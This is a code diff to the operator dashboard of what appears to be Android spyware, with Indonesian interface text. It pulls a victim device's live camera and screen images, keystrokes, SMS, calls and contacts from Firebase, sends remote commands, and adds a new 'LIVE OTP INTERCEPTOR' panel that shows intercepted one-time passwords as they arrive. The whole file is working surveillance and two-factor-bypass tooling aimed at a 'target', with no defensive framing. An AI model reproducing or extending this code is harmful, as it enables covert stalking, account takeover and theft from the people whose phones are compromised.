@@ -29,14 +29,16 @@
         .btn-cmd { padding: 10px 20px; background: transparent; border: 1px solid #00ffaa; color: #00ffaa; cursor: pointer; margin: 5px; font-weight: bold; }
         .btn-cmd:hover { background: #00ffaa; color: black; }
         #liveImg { max-width: 100%; border: 2px solid #00ffaa; margin-top: 10px; }
-        .log-item { border-bottom: 1px solid #333; padding: 5px 0; font-size: 13px; }
+        .log-item { border-bottom: 1px solid #333; padding: 8px 0; font-size: 13px; }
+        .otp-item { background: #2a002a; border-left: 3px solid #ff00ff; padding: 10px; margin-bottom: 5px; }
+        .log-box { height: 350px; overflow-y: scroll; background: #000; padding: 10px; border: 1px solid #333; }
     </style>
 </head>
 <body>
     <div class="header" id="deviceInfo">Loading Device Information...</div>
 
     <div class="tab">
-        <button class="tablinks active" onclick="openTab(event, 'Surveillance')">📡 Live</button>
+        <button class="tablinks active" onclick="openTab(event, 'Surveillance')">📡 Live Monitor</button>
         <button class="tablinks" onclick="openTab(event, 'Location')">📍 Lokasi</button>
         <button class="tablinks" onclick="openTab(event, 'SMS')">💬 SMS</button>
         <button class="tablinks" onclick="openTab(event, 'Logs')">📞 Call/Contacts</button>
@@ -47,16 +49,22 @@
         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
             <div>
                 <h3>⌨️ REAL-TIME KEYLOGGER</h3>
-                <div id="keyloggerData" style="height: 350px; overflow-y: scroll; background: #000; padding: 10px; border: 1px solid #00ffaa;">
+                <div id="keyloggerData" class="log-box" style="border-color: #00ffaa;">
                     Menunggu input...
                 </div>
             </div>
             <div>
-                <h3>📷 CAMERA / SCREEN</h3>
-                <div id="cameraData" style="text-align: center;">
-                    <img id="liveImg" src="" alt="No Image Captured">
-                    <p id="imgTime" style="font-size: 10px; color: #888;"></p>
+                <h3 style="color: #ff00ff;">📟 LIVE OTP INTERCEPTOR</h3>
+                <div id="otpBox" class="log-box" style="border-color: #ff00ff;">
+                    Menunggu OTP masuk...
                 </div>
+            </div>
+        </div>
+        <div style="margin-top: 20px; text-align: center;">
+            <h3>📷 LIVE CAMERA / SCREEN</h3>
+            <div id="cameraData">
+                <img id="liveImg" src="" alt="No Image Captured">
+                <p id="imgTime" style="font-size: 10px; color: #888;"></p>
             </div>
         </div>
     </div>
@@ -67,7 +75,7 @@
     </div>
 
     <div id="SMS" class="tabcontent">
-        <h3>💬 SMS MESSAGES</h3>
+        <h3>💬 SMS MESSAGES (HISTORY)</h3>
         <div id="smsData">Loading...</div>
     </div>
 
@@ -95,7 +103,7 @@
         const urlParams = new URLSearchParams(window.location.search);
         const deviceId = urlParams.get('id');
 
-        // 1. INFO DEVICE (STATUS ONLINE/BATTERY)
+        // 1. INFO DEVICE
         firebase.database().ref(`devices/${deviceId}`).on('value', snap => {
             const data = snap.val();
             document.getElementById('deviceInfo').innerHTML = `
@@ -104,7 +112,7 @@
             `;
         });
 
-        // 2. LIVE CAMERA LISTENER
+        // 2. LIVE CAMERA
         firebase.database().ref(`live/screen/${deviceId}`).on('value', snap => {
             if (snap.val()) {
                 document.getElementById('liveImg').src = "data:image/jpeg;base64," + snap.val();
@@ -112,18 +120,31 @@
             }
         });
 
-        // 3. KEYLOGGER LISTENER
+        // 3. KEYLOGGER
         firebase.database().ref(`logs/keylogger/${deviceId}`).limitToLast(20).on('value', snap => {
             let html = '';
             snap.forEach(child => {
                 const log = child.val();
                 html += `<div class="log-item"><span style="color:#00ffaa;">[${log.app}]</span>: ${log.content}</div>`;
             });
-            document.getElementById('keyloggerData').innerHTML = html || 'Belum ada log ketikan.';
+            document.getElementById('keyloggerData').innerHTML = html || 'Menunggu target mengetik...';
             document.getElementById('keyloggerData').scrollTop = document.getElementById('keyloggerData').scrollHeight;
         });
 
-        // 4. LOAD DATA TABS
+        // 4. LIVE OTP INTERCEPTOR (NEW)
+        firebase.database().ref(`logs/otp/${deviceId}`).on('child_added', snap => {
+            const data = snap.val();
+            const box = document.getElementById('otpBox');
+            if(box.innerText.includes("Menunggu")) box.innerHTML = "";
+            
+            box.innerHTML = `<div class="otp-item">
+                <strong style="color: #ff00ff;">DARI: ${data.sender}</strong><br>
+                <span>${data.content}</span><br>
+                <small style="color: #888;">${new Date(data.timestamp).toLocaleTimeString()}</small>
+            </div>` + box.innerHTML;
+        });
+
+        // 5. LOAD DATA TABS
         function loadTabData(path, elementId) {
             firebase.database().ref(`${path}/${deviceId}`).on('value', snap => {
                 const data = snap.val();
@@ -142,12 +163,12 @@
             if(tabName === 'Logs') loadTabData('calls', 'logsData');
         }
 
-        // 5. COMMAND EXECUTION
+        // 6. COMMANDS
         function quickCmd(action) {
             firebase.database().ref(`commands/${deviceId}`).set({
                 cmd: action,
                 timestamp: Date.now()
-            }).then(() => alert("Command " + action + " sent!"));
+            }).then(() => alert("Perintah [" + action + "] Terkirim!"));
         }
 
         function sendCustomCommand() {
